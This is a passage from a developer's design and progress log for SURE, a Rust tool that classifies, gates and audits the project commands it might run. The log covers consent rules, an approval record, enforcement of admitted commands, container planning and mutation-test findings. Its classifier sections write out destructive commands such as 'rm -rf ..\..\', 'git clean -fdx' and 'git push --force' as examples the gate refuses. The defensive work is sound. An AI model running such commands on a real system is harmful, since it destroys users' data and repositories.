the working directory is where a checked project would keep a `docker` it would
like SURE to run. **No test holds it.** The nearest test,
`a_program_that_is_not_there_is_not_found`, passes an empty *directory*, which is
a different thing entirely; the only way to observe the difference is a file in
the working directory that the platform's `can_be_run` accepts, and on Unix that
needs an execute bit no file in the crate root has.

**Measured rather than reasoned.** The thirteen-line filter is deleted from
`doctor.rs` and the whole workspace suite is run: **45 result lines, 0 failed, 0
failing lines, exit code 0.** The mutation survives, which is what "no test holds
this rule" means in the only form that can be checked. `doctor.rs` was restored
from a backup in a `finally` and the worktree blob equals `HEAD`'s afterwards —
`6a1869bb7c9dea0c13ff08b48da962837515d0fc`, checked rather than assumed.

The gap is recorded in `DECISIONS.md` and here, and it is deliberately **not
fixed** — the fix belongs to `doctor`, whose task is accepted, and folding an
unrelated test into this commit would make the change harder to read than the gap
is dangerous. What `P3-T008` does instead is stop *repeating* the rule: the
module's own test that claimed to cover it was asserting nothing (it created a
fake `docker` and then asserted only that the current directory had not changed)
and was replaced by `the_first_runtime_in_the_search_order_is_the_one_reported`,
which builds a real directory holding a real `docker.exe` and a real `podman` and
asserts which one comes back.

### No spawn site was added, and this time it is not a near miss

`tests/spawn_sites.rs` counts three files that build a `Command`, all inside
`sure-core/src/process/`, and fails if a fourth appears or if anything outside the
runner names a `ProcessRequest`. **`container.rs` does neither**, and the reason it
was written that way is stated in its own module documentation: starting a
container is where the first spawn site outside the runner would go, and that is
the task *after* this one. What makes the restraint checkable rather than
intentional is that the census runs on all three platforms and the new module is
inside its walk.

### What this does not establish

**Nothing about a container that exists.** No process is started, so everything
here is a claim about an argument vector and not one about Docker's behaviour:
whether the runtime accepts these arguments, whether the image is present, whether
the mount actually appears, and whether the isolation is what the runtime claims
are all unverified by this task. **`isolation_claim()` is this build's sentence
about containers, not a measurement of one.**

**Nothing about resources.** No `--memory`, `--cpus`, `--pids-limit` or timeout
appears in the plan; a check inside a container can still take the whole machine,
and *"limited isolation"* is about reach and not about load.

**Nothing about `Access::ReadWrite`.** The method exists, is tested, and no
caller receives `ReadWrite` by any path other than naming it — and whether any
check should ever get it is the missing category's question, not this task's.

**Nothing about the plan being used.** Like `enforce.rs` and `approval.rs`, this
module has no caller. `P14-T006`, *"Implement execution-trust fixtures"*, is the
one dependent the task graph records, and its second acceptance sentence —
**"Container unavailable path is honest."** — is this task's first sentence
arriving later as a fixture.

## What `P3-T007` added

`crates/sure-core/src/enforce.rs`, 857 lines, 16 tests, plus a `pub mod enforce;`
in `crates/sure-core/src/lib.rs`, one visibility change in `consent.rs`
(`runs_project_code` became `pub(crate)`) and a new section in
`docs/architecture/EXECUTION_SAFETY.md`. Three commits, because two of them were
found after the first was pushed and read: `6353477` is the module, `18209d8` is
the batch-file test, `719253e` is the test a mutation showed was missing.

### The one thing a reader should check first: `Enforcement::admitted` is the only door

**`inspect_only` has been true of SURE so far because no code in this repository
launches a project process.** That is a fact about this build, not a property of
the mode — and `tests/spawn_sites.rs` says in its own documentation that it is
written to fail the day a check is wired to the runner. `enforce.rs` is what has
to exist before that day, and the whole of it is one sentence: a runner must take
what it launches from `Enforcement::admitted()` and from nowhere else.

`PermissionPlan::commands()` is *every command the plan considered*, including the
ones the mode stopped. `admitted()` is the subset that may run. **The difference
between those two iterators is the entire enforcement**, and the rule that keeps a
runner to the second one is a rule about the caller — no type in this repository
can hold it. `spawn_sites.rs` is where it becomes testable, and wiring the runner
up is the task that has to extend that test rather than merely pass it.

### The classification is made before the refusal, and the order is the point

A check is put in `static_checks` or `dynamic_checks` from what its commands
**would** use, and only then removed if one of them will not run. So under
`inspect_only`, a check that would run the project's code lands in
`dynamic_checks` and is immediately excluded from it, with the reason the command
already carried. **A plan's `dynamic_checks` is therefore empty in a mode that
runs nothing, and that is not the same statement as "nothing was classified
dynamic"** — the classification was made and then acted on.

Doing it the other way round — deciding the refusal first — would leave a report
unable to tell *this check reads files* from *this check would have run your code
and the mode stopped it*. The second is the sentence a user most needs.

### A check is a unit, and the rule costs a runnable command

A check with one allowed command and one refused command **does not run at all**.
The allowed half is not admitted either. A verdict for half a check is a verdict
for a check that did not happen, and running the allowed half would be work for a
result no report will read. The cost is real — a `git status` inside a check whose
`npm test` was refused never runs — and the alternative is worse.

### `NeedsConsent` becomes a stop, because there is nobody here to ask

`decide_for`'s third rule produces `NeedsConsent` exactly when the mode is too
cautious and a user could say yes. `enforce.rs` has no prompt, no user and no way
to wait, so it stops such a command under the reason it already carries.

**The reason is `ExecutionNotAuthorized`, and deliberately not `UserDeclined`** —
nobody declined anything, and `P3-T006` established that only a refusal entitled
to that word may use it. The case that makes this concrete, and it is the one to
remember before writing a test: **`git push --force` is `NeedsConsent` in
`host_confirmed` with every permission granted**, because `Destructive` has no
permission to grant. A maximally permissive user still gets a stop rather than a
green, which is the cautious direction and the right one here.

### `unscheduled()`: the one path by which a plan could have run something it never listed

The permission plan and the check schedule are built in two different places and
can disagree. A command planned against a check that was **not** scheduled is not
admitted, and the check id is reported by `unscheduled()` rather than absorbed.
Running it would be work for a check that is not in the plan, and so for a result
no report will ever read. This is the same shape as
`PermissionPlan::exclude_refused_from`'s `not_in_the_plan`, and it exists for the
same reason: this repository treats a silently absorbed anomaly as worse than a
visible error.

### `runs_project_code` is one function with two callers, not two copies

`consent::runs_project_code` became `pub(crate)`. It is the rule that decides both
whether a command needs asking (the mode rule) and whether a check is dynamic, and
those two answers have to be about the same set of categories. A copy in
`enforce.rs` is where they would drift, and the drift would be invisible: a check
classified static while its command was being stopped for running project code.
The visibility change is the minimum that lets one module call it, and **a third
caller would be one too many** — the doc comment says so.

### `CheckPlan::exclude`'s return value is the latch, and that is why it is read

`stopped` is a `Vec<CheckResult>`; `CheckPlan::excluded` is a `Vec<NotCheckedReason>`
with no ids. The only thing tying a reason to a check is that both were pushed in
the same pass, and `if checks.exclude(id, reason) { stopped.push(result) }` makes
that structural rather than remembered: the reason is appended inside `exclude`
only when it returns `true`, and the result only when it returns `true`. Two
vectors that cannot get out of step, and nothing to test except that the latch is
being used — which is what `the_stopped_results_and_the_excluded_reasons_are_in_step`
reads back over every mode and every permission set.

### A batch file, and the third task to meet the question without settling it

`safety::classify` answers before the table is reached for any `.cmd`/`.bat` name,
with `anything()` — every category but `Static`, **`Destructive` included**.
`Destructive` has no permission, so `decide_for`'s rule 2 answers for every batch
file before the grants are consulted, and the only two answers available are
`Denied` and `NeedsConsent`. **Neither is `Allowed`, so no permission set reaches
a batch file in any mode**, and `enforce.rs` stops either answer.

**Whether a caller may ever name a batch file is still open, and this task did
not settle it.** It is `P3-T004`'s classification, `P3-T005`'s permission and this
task's enforcement; this is the third of those to meet it and the third to leave
it open — which is exactly what this file predicted would happen to whoever
started `P3-T007`. The question is recorded in `crates/sure-core/src/process/mod.rs`
(*"Whether a batch file may be named is not decided here"*) and in
`process/error.rs`, and **the owner decision is still item 26 below**.

### The four mutations, and the one that found the tests were the thin part

Four mutations were run against the module, one at a time, and the third found a
hole in the tests rather than in the code. **The table, the finding and what the
existing non-vacuity guard does and does not cover are in "Adversarial (mutation)
verifications on this branch", under the `P3-T007` heading there**, because that
is where this file keeps them — and the one sentence to carry away is that
replacing the branch filling `CheckPlan`'s two lists broke **exactly one** test,
which was asserting `dynamic_checks.len() == 1` for an unrelated purpose. **A
field whose contract hangs on one unrelated assertion is a field nothing is
holding**, and the third commit is the test that holds it directly.

### No spawn site was added, and what that means for whoever wires the runner

`tests/spawn_sites.rs` passes unchanged at three entries, and `enforce.rs`'s only
mention of `std::process` is a doc link in the module comment. So the census, and
`support::CEILING`'s justification, are exactly where they were — and
`docs/architecture/EXECUTION_SAFETY.md` now carries the section that says what
this mechanism is and the two things it is not: not a sandbox, and a question
turned into a stop.

**The next task in the DAG whose acceptance is about starting something is
`P3-T009`** — *"Can start/stop supported local services with timeouts and
captured logs"* — and **it does not depend on `P3-T007`.** Its `depends_on` is
`["P3-T001", "P3-T006"]`, both accepted, so it is READY now, beside this task
rather than behind it. **And `P3-T007` has no dependents at all**: `grep -c
'"P3-T007"' tasks/tasks.json` answers **1**, and that one is its own `id` — no
task in the graph names it in a `depends_on`, so accepting it changed the READY
list by removing it and by nothing else, which is the 15 → 14 this acceptance
measured.

That is worth stating plainly, because it is the second place the same shape
appears: **the enforcement is a rule about the caller, and the DAG does not carry
that rule either.** A dependency edge says *do this after that*, and nothing in
`tasks/tasks.json` makes `P3-T009` consult `enforce.rs` — a supervisor that starts
a service directly would satisfy its own acceptance sentence and this one would
still be green. Whoever takes `P3-T009` should expect `spawn_sites.rs` to fail,
should extend its census rather than silence it, and should make the new entry a
statement that its command lines came from `Enforcement::admitted`.** Nothing
enforces that except the person reading this paragraph.

### What this does not establish

**Nothing about a process**: which command lines may be handed to a runner, and
nothing about what one does when it runs — `safety::classify`'s own caveat,
unchanged by being consulted here. **Nothing about a caller that ignores it**, as
above. **Nothing about `WriteProject`**: a command that merely writes inside the
project is still outside this vocabulary, so "no project code runs" is not the
same claim as "the project is untouched" — the Git filter refusal in
`EXECUTION_SAFETY.md` is what actually covers that. **Not a sandbox.** **Nothing
about a check with no commands**: it goes to `static_checks` because nothing is
launched for it, which is a statement about this module and not a promise about
whatever performs it.

## What `P3-T006` added

Implement `host_confirmed` execution mode. Acceptance: *"Only approved command
categories execute."* / *"Approval state is locally auditable."*

One commit, `d58532a`, six files.

| file | change | what it is |
| --- | --- | --- |
| `crates/sure-core/src/approval.rs` | +1777 (new) | the request, the consent, the gate and the record, 24 tests |
| `crates/sure-domain/src/execution.rs` | +158 | `ApprovedCommand::effects` (field + doc), `CommandEffects::covers`, its hand-written `Deserialize`, 4 tests |
| `crates/sure-core/src/store/record.rs` | +90 / −6 | `RecordKind::Approval`, the third schema-less kind, 2 tests |
| `crates/sure-core/src/store/mod.rs` | +59 / −1 | `HistoryFilter::approvals`, `Store::append_approval` |
| `crates/sure-core/src/lib.rs` | +1 | `pub mod approval;` |
| `progress/state.json` | +4 / −4 | `taskctl start` |

### The one thing a reader should check first: `ApprovedCommand::effects`

`ApprovedCommand` had four fields and every one of them said *what would run*.
"Only approved command categories execute" is not a statement about a command
line; it is a statement about a command line **and the categories the user agreed
to**, and there was nowhere to put the second half. The fifth field is that half.

**The reason it is load-bearing rather than tidy is a proof about this codebase
that the field exists to break.** `safety::classify` is deterministic on
`(program, arguments)`. So inside one build, a gate that re-derived the categories
at the moment of deciding would compute exactly the value it was checking against,
and every command would be approved by construction — the acceptance sentence
would be true and would mean nothing. **What makes it mean something is that an
approval outlives the build that wrote it**: it is written to the store, read back
by a later SURE, and put to a classifier that may since have learned a category
the old one did not know. `git clean -fdx` approved as destruction and later read
as destruction is the same answer; the same command line approved as *static* and
now read as destruction is not, and a record without categories sails straight
past it. `Refusal::CategoryNotApproved` is that case, and it is where the first
acceptance sentence is enforced rather than asserted.

### Two doors onto `CommandEffects`, and they lean "cautious" opposite ways

- `of(&[])` answers `anything()`. A *rule* that named no category has said nothing
  about a command, and for a classification silence must land on the dangerous
  side.
- `Deserialize` **refuses** an empty list. A value arriving over a wire is not a
  classification, it is a claim about something that already happened, and reading
  *this approval covers nothing* as *this approval covers everything* is the worst
  possible reading of the one field the gate depends on.

This is the only hand-written `Deserialize` in the workspace, and it is written
with the UFCS form of `custom` so that no trait has to be imported for one call.

### `covers` is a subset test, and the correction to my own test

An approval covers a command that falls *inside* it. Gaining a category nobody
agreed to is a refusal; **shrinking is not**, and
`a_wider_approval_than_the_reading_is_still_covered` holds that half.

**`Static` is not a subset of `Install, Network` — it is a different reading — and
my first version of `covers_is_one_way_and_says_which_way` asserted the
opposite.** The suite caught it. The assertion says `false` now and carries the
reason the case cannot reach the gate: a static-only command is `Permitted` by
`Permission::Inspect` in `standing_for`'s first branch, before any consent is
consulted, so the question `covers` answers is only ever asked about a command
that needs consent. **No special case was added for `Static`**, because a rule
with no producer of the case it handles is vocabulary rather than behaviour.

### The gate, in the order it decides

1. `is_allowed()` — `Permitted`, before any consent is consulted.
2. A grantor that cannot grant — `GrantorCannotGrant`. **A project file cannot
   build a consent for itself**, and `a_project_file_cannot_build_a_consent_for_itself`
   holds it.
3. A command no permission covers — `NotPermitted`, **carrying the plan's own
   reason rather than recomputing one**.
4. Not among the commands the user was shown — `CannotBeShown`.
5. No approval under this check — `Declined`.
6. No `(program, args)` match among that check's approvals —
   `NotTheApprovedCommand`.
7. A different working directory — `DifferentWorkingDirectory`.
8. `!approved.effects.covers(command.effects())` — `CategoryNotApproved`.
9. Otherwise `Approved`.

**It keys on the plan index rather than the check id, because one check can plan
two commands.** `npm ci` and then `npm test` are one check, and the second is not
approved by the first one's answer. Matching on the check alone would have been
the classic false green: a `git clean -fdx` approval admitting a `git clean -fd`
plan because the two share a check.

### `NotCheckedReason::UserDeclined` has its first producer, and only one refusal is entitled to it

`P3-T005` recorded why it did not use the word — *"nothing has been declined, and
a report that said so would be inventing an event"* — and named this task as the
prompt that can be declined. Only `Refusal::Declined` gets it: the command was in
the `ConsentRequest` and is not in the `HostConsent`, so it was shown and not
approved.

The two neighbours are deliberately **not** the same word. `CannotBeShown` is a
command that needed an answer and could not be rendered at all, so nobody was
asked. `NotPermitted` was decided by the plan before anyone was asked. Both report
`ExecutionNotAuthorized`, and
`a_command_no_permission_covers_is_denied_outright_when_the_mode_runs_nothing`
asserts a destructive command under inspect-only is refused under **the plan's**
reason rather than under `UserDeclined` — **the user was never asked, so nothing
was declined.**

### Where the record lives, and why it is not an eighth `DocumentKind`

`RecordKind::Approval` is the third schema-less kind in the store, and its history
rule is the **opposite** of `Recording`'s. A recording is bulky captured material
the user opted into, and the default filter keeps it out; an approval is a
statement about what SURE was allowed to do, and a kind the default filter
excluded would make the audit trail invisible to the one command a user would look
in. So `HistoryFilter::default()` includes it, `HistoryFilter::approvals(fingerprint)`
reads one project state's, and it is still deletable because
`docs/security/PRIVACY.md` gives the user the whole local history and not a part
of it.

The alternative was an eighth `DocumentKind`, and it was refused for a reason
worth stating: that registry is the integration-protocol contract with harnesses,
`docs/architecture/PROTOCOL.md` already carries a version gap, and making it grow
for SURE's own internal audit trail puts this task's business in someone else's
room. The drift guard that used to say `is_recording()` now says
`is_recording() || is_approval()` **and asserts the count of schema-less kinds is
exactly 2**, so a fourth cannot arrive quietly. **It broke on this change and was
rewritten having been read** — which is what it is for.

### `ADR 0009`'s "after the fact" sentence, satisfied by two timestamps rather than a new word

The ADR says *"An approval made after the fact is recorded as such rather than
presented as pre-authorisation."* The tempting move was an `ApprovalOrder` enum
with a `PreAuthorised`/`AfterTheFact` pair. It was not taken:
`docs/architecture/FROZEN_SEMANTICS.md`'s rule is that a variant the code cannot
produce is not vocabulary but an invitation to produce it wrongly, and **nothing
in this release can produce an after-the-fact approval** — there is no repair loop
that would need one. What the record carries instead is `granted_at`, supplied by
the caller in the user's own terms, and `RecordedApproval::written_at_ms`, the
store's clock. They are kept apart rather than reconciled. When a task can
actually take an approval after the fact, that task adds the vocabulary, and this
paragraph is the reason it was not added early.

### A command SURE cannot render is unaskable *and* unrecordable

`ApprovedCommand`'s fields are `String`, so a command line that does not render as
text has nowhere to be recorded. It is therefore **structurally unapprovable**,
and that falls out of the types rather than being enforced:

- `ConsentRequest::of` puts it in `unrenderable` **with its place in the plan**
  rather than dropping it.
- `explain` prints that it could not be shown.
- The gate refuses it with `CannotBeShown`.

**A question that quietly lost a command would be a prompt the user answered
without having been asked about all of it**, which is the same defect as a report
that quietly loses a check.

### The finding that cost a test, and it is about how narrow the prompt surface is

Under `host_confirmed` with **every permission granted**, `cargo add serde` is not
a question — it is `Allowed`. `Install` counts as running project code
(`P3-T005`'s finding) and host-confirmed runs project code, so it never reaches a
prompt. My first version of the category test used it, found no requested command,
and panicked on an empty list.

The test uses `git push --force origin main` now, which classifies as
`[Network, Destructive]` and **stays a question under every permission set**,
because `Destructive` has no permission that covers it. **A test that cannot reach
the code it tests has not run**, and this one failed loudly rather than passing
green over nothing. The finding itself is recorded rather than worked around:
under the most permissive mode there is, the only commands that reach a user are
the destructive ones and the ones SURE could not read.

### The second structural fact about `WhyAsked`: the two reasons cannot co-occur

`decide_for` asks about the ungrantable category **before** the mode, so a
destructive command under a mode that runs nothing is `Denied` rather than
`NeedsConsent` and never reaches a prompt. A test pins that, and pins that its
reason is **not** `UserDeclined`.

`WhyAsked::line` answers `None` for a permission-shaped question, because
`PlannedCommand::explain` already prints exactly that sentence and `P3-T005` owns
its wording. A second copy in the new type would have printed it twice, which
`the_plan_explains_a_command_once_and_the_prompt_does_not_say_it_again` holds.

### The correction to `d58532a`'s own message, which cannot be rewritten

**`d58532a`'s message says `approval.rs` is "1490 lines". It is 1777.** The number
came from a note taken while the file was still growing and was never re-measured
against the tree being committed; the commit's own `--numstat` reads `1777 0`, and
`wc -l` on the committed blob agrees. The figure is prose in a pushed message, so
it stays wrong where it is and is corrected here, per the no-rewrite rule every
other correction in this file follows.

The rest of that message's counts were re-measured against the committed tree
before this section was written and are right: `+30` in both directions, the six
per-file numbers in the table above, `0 failed` and `9 ignored` over 44 result
lines.

### No spawn site was added, and the ceiling's justification still holds

`THE_SPAWN_SITES` in `tests/spawn_sites.rs` is still **three entries**, and
`nothing_outside_the_runner_names_a_process_request` passes. `approval.rs` plans,
records and authorises commands and builds none: it imports nothing from
`std::process`, and its only mention of the runner is a doc comment saying which
caller does not exist yet. `sure_core::support`'s level-C ceiling is justified by
*no project code running*, and the module that decides what is allowed to run
still cannot run anything.

### What this does not establish

**Nothing has been run**, and `Authorisation::admitted` is not a claim that
anything has — it is the only door to a command a caller could start, and no
caller exists. **Nothing about a caller at all**: `HostConsent` still has no
producer outside a test. **Nothing about what an approved command will do**;
approving a command line is not approving the code behind it. **Nothing about
whether the user understood the question** — what is recorded is what was shown
and what was answered, and the two are the same value by construction. **Nothing
about a prompt having been displayed**: `ConsentRequest` is by definition what
SURE shows, and nothing in this repository can observe a human reading a prompt,
so a caller that builds one and never displays it has a bug this module cannot
see — `Refusal::Declined` would then be reporting a decline that never happened.
**Not a cryptographic record**: a local row in a local database the user owns and
can delete, which is what `PRIVACY.md` promises rather than a weaker version of
it. **Not a check that a plan is complete**: the gate decides about the commands a
plan holds and says nothing about one that was never planned. **Nothing about
`WriteProject`** — a command that merely writes inside the project is still
outside this vocabulary.

## What `P3-T005` added

Implement the execution permission/consent plan. Acceptance: *"Check plan can
explain which commands need permission and why."* / *"Denied command becomes
skipped/not checked, never pass."*

One commit, `c940300`, six files.

| file | change | what it is |
| --- | --- | --- |
| `crates/sure-core/src/consent.rs` | +1407 (new) | the plan: classification + decision + check plan, 22 tests |
| `crates/sure-domain/src/vocabulary.rs` | +67 | `CheckPlan::exclude` (27 lines) and its two tests |
| `crates/sure-core/tests/spawn_sites.rs` | +65 / −1 | the matcher fix: a spawn, not a name ending in `Command` |
| `crates/sure-domain/src/execution.rs` | +54 | `CommandClass::plain_description` (24 lines) and its test |
| `crates/sure-core/src/lib.rs` | +1 | `pub mod consent;` |
| `progress/state.json` | +4 / −4 | `taskctl start` |

### The second acceptance sentence is structural

`PlannedCommand::refusal` is the only place in the module that produces a
`CheckResult`, and it cannot produce a passing one. A command that may run returns
`None` — what to report about it depends on what happens when it does, and nothing
has happened yet. A refused command returns `CheckResult::not_run`: `Skipped`, with
its reason and its weight kept. Two mutations are aimed at this — a `Pass` where a
`Skipped` belongs, and the same `Skipped` with `Severity::Note` and `false` — and
both are caught.

### The three rules, in `decide`'s order

1. **A missing permission denies.** Every category the command may fall into is
   checked against the grants; one missing permission is enough. First because it
   is the only one of the three that is not a question.
2. **A category with no permission is never covered by a grant.**
   `CommandClass::Destructive` answers `None`, so the command needs its own
   approval naming its exact argument vector. Checked *before* the mode, because a
   cautious mode is a question to ask and a missing permission is not.
3. **The mode, last.** Running project code under a mode that runs nothing is
   `NeedsConsent`, not `Denied`.

`decide_for` is written out rather than delegating to `decide`, because
`CommandEffects` is a *set* and can hold combinations no single `ActionKind`
describes. What makes that safe is the agreement test: both deciders, over every
category that has an `ActionKind`, in every mode, under a read-only and a fully
granted permission set. It is the test that found `Install` missing from rule 3.

### What `Destructive` getting no permission means

`P3-T004` left `required_permission()` answering `None` for `Destructive` and
recorded the question — where does the "writes inside the project" category live —
against this task. The answer is that it still lives nowhere: **no sixth category
was invented**, because `P3-T004`'s acceptance names five. What is new is the
other half. A category the user *cannot* grant is not a missing grant; it is a
command that needs its own approval, and `ungrantable()`, `awaiting_own_approval()`
and the *"No permission SURE can ask for covers this"* line are that answer in the
three places a caller needs it. `git commit` still reads as `UnknownOperation`,
which is true and temporary.

### `CheckPlan::exclude`, and a doc comment its code disagreed with

The method removes a check from `static_checks` and `dynamic_checks` **and**
records the reason, because a plan holding a check in `dynamic_checks` *and* in
`excluded` reads as "will run" to a caller iterating one field and "will not run"
to a reader looking at the other. Its first version recorded the reason
unconditionally while its own paragraph said a check the plan never held is not
recorded at all; the paragraph was right and the code now matches it.
`exclude_refused_from` returns those ids rather than absorbing them, because a
command planned against a check the plan does not contain means two check sets
were assembled into one plan.

### The spawn-site census: a name is not a spawn

`tests/spawn_sites.rs` failed on `consent.rs` because `PlannedCommand::new(`
contains the substring `Command::new(`. `consent.rs` builds nothing — no
`std::process` import anywhere, and its one mention of `ProcessRequest` is a doc
comment saying why `PlannedCommand::new` does not take one. **Renaming the type
would have made the test pass and left the matcher wrong.** The matcher now
requires the character before `Command` to be one that cannot be part of an
identifier; the rule is unchanged, and the alias hole
(`use std::process::Command as C;`) existed before and after. A test states the
spellings it must tell apart and the pair of behaviours around comments.

### What this does not establish

No consent record, prompt or host-execution authorisation — `HostConsent` exists
in the domain and nothing constructs one. Nothing about what a command does when
it runs. Nothing about the TOCTOU window between planning a command line and
running it. Not a check that a check plan is complete. And nothing about
`WriteProject`: a command that merely writes inside the project is still outside
this vocabulary.

## What `P3-T004` added

Implement command/operation classification. Acceptance: *"Static/read-only,
dynamic host, install, network, destructive categories are distinct."*

One commit, `967c5e6`, five files, purely additive — 424 insertions and 1 deletion
across the tracked files, and the deletion is an import line that got longer.

| file | change | what it is |
| --- | --- | --- |
| `crates/sure-core/src/safety.rs` | +1278 (new) | the classifier and its table |
| `crates/sure-core/tests/command_safety.rs` | +637 (new) | the acceptance-facing tests |
| `crates/sure-domain/src/execution.rs` | +414 | `CommandClass`, `CommandEffects`, 10 module tests |
| `crates/sure-domain/tests/wire_contract.rs` | +10 / −1 | the five wire names, frozen |
| `crates/sure-core/src/lib.rs` | +1 | `pub mod safety;` |

### Distinct by construction and distinct in behaviour are two claims, and the second is the acceptance

An enum whose variants differ is distinct by construction, and `rustc` enforces
it; what it does not enforce is that a *command* can be told apart under one
category from the same command under another. That is the acceptance sentence,
and it is held by a test that takes **every ordered pair of the five** and shows a
witness command answers differently under one than under the other. The witnesses
are `git status`, `npm test`, `cargo add serde --offline`, `git fetch` and `git
reset --hard`, one carrying each category alone, and the test asserts the witness
table is as long as `CommandClass::ALL` — **so a sixth category added without a
witness fails the test rather than passing quietly**, which is the property a
hand-written list cannot have.

### The one rule the module is arranged around, and the direction it fails in

**Nothing is `Static` unless a rule in the file says so.** A program the table has
no row for, a known program with an operation the table has no name for, and a
command line whose meaning is in text SURE cannot read all come back as *every
category but `Static`* — not an empty set, not "unknown". A classifier that
answered "read-only" about a command it did not recognise is the false green this
product exists to prevent, and **it is the one mistake here that nothing
downstream could catch**: every later check would be reading a command SURE
believed it had understood.

The three causes are kept apart in `Source` anyway, because they have three
different follow-ups — an unknown program means the table needs a row, an unknown
operation means the same program needs a row, and unread text is the one more
table work cannot fix, since the command line SURE assembled is not what decides
what runs. A reader who sees only "not static" learns none of that.

A fourth cause is the one that is easy to miss and is worth naming: **an argument
that is not text SURE can read makes the whole line unread rather than being
dropped.** Dropping one token from `git <bytes> status` would leave SURE reading
the `status` behind the bytes and answering `Static` — about a command line it did
not read, which is the same failure wearing a different hat. It is held by
`an_argument_sure_cannot_read_makes_the_whole_command_unreadable`.

### `Destructive` has no permission that covers it, and that is the deliberate half of `P3-T005`'s question

`CommandClass::required_permission()` answers `None` for `Destructive`. The
tempting answer is `WriteProject`, and it is wrong in both directions that matter:
`WriteProject` is writing *inside* the project, which `rm -rf ..\..\` is not, and
`git push --force` is not a write at all. Folding destruction in would let **a
consent to write a file read as a consent to destroy the machine**, which is
exactly the class of mistake this module exists to prevent. `ungrantable()` is the
door a caller uses to find that out, and a test holds it. What *should* cover
`Destructive` is `P3-T005`'s question; answering it here would have put a
permission decision inside the classifier.

### The answer is a set, and it is an upper bound

`cargo add serde` installs a package *and* reaches the registry, so one value
would have to drop one of those facts. `CommandEffects` holds the categories a
command **may** fall into and never claims it does all of them, and the direction
is deliberate: asking for one consent too many costs a prompt, asking for one too
few is the failure. Two rules are per-flag rather than per-program for the same
reason. `--dry-run` takes `Install` and `Destructive` away and leaves `Network` —
a dry run still looks — and where a command is left with nothing it takes its
program's own class instead, which is how `git clean --dry-run` reads as the
report it is rather than as the deletion it is not. `--offline` takes away
`Network` and only that spelling, because `--frozen` means "do not update the
lockfile" to some tools and "do not touch the network" to others, and a rule that
guessed would be reading two tools' grammars as one.

### One correction during the work, against my own first table, caught by a test

`python -m pip install` was filed as `Install` alone. The integration test that
walks the command set **SURE's own discovery builds** failed on it, and the domain
was the authority: `ActionKind::InstallDependencies` has `executes_project_code()`
true and `can_touch_network()` true, because a source distribution is built by a
build backend the package brought with it and npm runs `preinstall`/`install`/
`postinstall`/`prepare` around an install. The table was wrong. Everything that may
run a package's own install steps is `INSTALLS_AND_RUNS` now; `RESOLVES` is what
cargo's manifest-only operations get, and the single-category `Install` witness
survived as `cargo add serde --offline`, which edits a manifest and runs nothing.
The test that caught it walks `cargo test`, `npm test`, `npm run build`,
`python -m pytest`, `python -m pip install -r requirements.txt`, `python -m build`,
`uv run pytest`, `uv sync` and `poetry run pytest`, **so a change that stops
classifying one of them fails rather than going unnoticed** — which is the form in
which "the table holds what SURE runs" is a fact rather than an intention.

### The vocabulary gap, stated rather than papered over

The acceptance names five categories and **none of them is "changes files in this
directory without destroying anything"**. So `git commit` and `git branch -m` are
`UnknownOperation` — not `Static`, and not a sixth class invented here, because
inventing one would have satisfied the acceptance sentence by making it describe
something other than the code. `git pull` *is* classified, and the distinction is
the rule: one of *its* effects is a category the vocabulary has. `git branch`,
`tag`, `config`, `remote`, `stash`, `cargo clean` and `npm audit` are absent on
the rule the file writes down — **a verb is in the table only when every form SURE
can name has an effect SURE can name.**

This is worth a reader's attention because it will read as a gap to anyone who
runs SURE on a repository: `git commit` answering "I do not know this operation"
is a *true* answer and a temporary one, and where the sixth category lives is the
next task's decision.

### A name is read the way the operating system resolves it, and the gate is a value

`normalise` takes the last path component on both separators, and on Windows it
does two more things the operating system does — ignores case and elides a
trailing `.exe`. The condition is `cfg!(windows)`, **not** `#[cfg(windows)]`, so
both arms compile and the difference is a value rather than a deleted branch. That
is `P3-T003`'s lesson applied rather than restated, and this run is where it was
checked rather than assumed: the test holding the rule is present and runs **on all
three platforms**, reading each platform's own arm. A `.cmd` or `.bat` **name** is
unread text whatever it is called and whatever is in it, because a name is not
evidence of behaviour.

### The mutation run: three findings, two of them corrections to me

`target/tmp/mutate20.py`, 29 mutations: **27 observable mutations caught by a
failing test, and 2 declared unobservable as expected.**

**The first finding is that the harness refused to start, and the refusal earned
its keep on its first run.** It reported an anchor matching 0 times — which is
what a leftover mutation from an interrupted run looks like — and the cause was a
wrong anchor instead: the `is_static_only` predicate lives in `execution.rs`
(`Classification`'s is a one-line delegation) and I had aimed at `safety.rs`. **A
wrong anchor and an applied mutation are indistinguishable from a count**, which
is the reason the guard prints the anchor, the file and the count rather than just
refusing.

**The second finding is that the two mutations I declared unobservable came back
CAUGHT, and my prediction was backwards.** The claim was that forcing the *Unix*
half of the name rule — answering a name without lowercasing it — would be
invisible on Windows. It is not. `cfg!` makes both arms compile and then **one of
them runs**, so `windows_elides_an_exe_suffix_and_ignores_case_and_unix_does_neither`
asserts *this machine's* rule, and forcing the other platform's rule into the code
breaks it here. The predicate was written the other way round: what no test on this
machine can see is the **Windows rule applied everywhere**, because on Windows that
is not a change at all. The declarations name that pair now, and each is marked so
that **a Unix CI run would report "DECLARED UNOBSERVABLE BUT CAUGHT"** — which is a
stale declaration, a fact about the harness rather than about the code, and the
intended failure. The pair is kept for exactly that reason: it is a standing
written record of the one behaviour in `normalise` that the platform this
repository develops on cannot check.

**The third finding is a real hole, and it was closed with a test rather than an
argument.** `is_batch_file`'s `to_ascii_lowercase()` is a second copy of a rule
`normalise` has already run on Windows, so **deleting it is invisible through
`classify` on this platform** — the integration test that passes `NPM.CMD` and
`thing.Bat` stayed green, and it is a good test that simply cannot see this. On a
platform whose normalisation leaves the case alone it is the only copy, and what
it protects is the *reason* SURE reports rather than the answer it gives, since an
unknown program and unread text are both every category but `Static`. It is now
held by `a_batch_file_is_recognised_in_whatever_case_its_name_is_written`, which
calls `is_batch_file` directly — **the only surface on this machine where the
difference exists** — and the mutation is CAUGHT. This is the P3-T003 shape a third
time, in a new place: a platform's own behaviour hiding a path from the tests that
run on it.

### What `P3-T004` does not establish

- **Nothing about the code the command runs.** A project's test script can delete
  a directory, and that is a fact about the script. The categories are a statement
  about the command, which is also the domain's own model — `RunProjectCode` and
  `Network` are separate decisions and neither implies the other.
- **Nothing about what is on `PATH`.** This reads names; it does not find, stat or
  open the program, and a project that puts its own `git.exe` first gets it
  classified as git. Finding the program is a different question, and answering it
  here would not make the answer safe: the file can be replaced between the looking
  and the running.
- **No shell grammar, and no wrapper is read through.** `env`, `timeout`, `nice`,
  `xargs`, `sudo` and `cmd` are not looked behind, because a wrapper is an argument
  grammar SURE would have to implement before it could see the program behind it,
  and one implemented by guesswork produces **a confident answer about a program
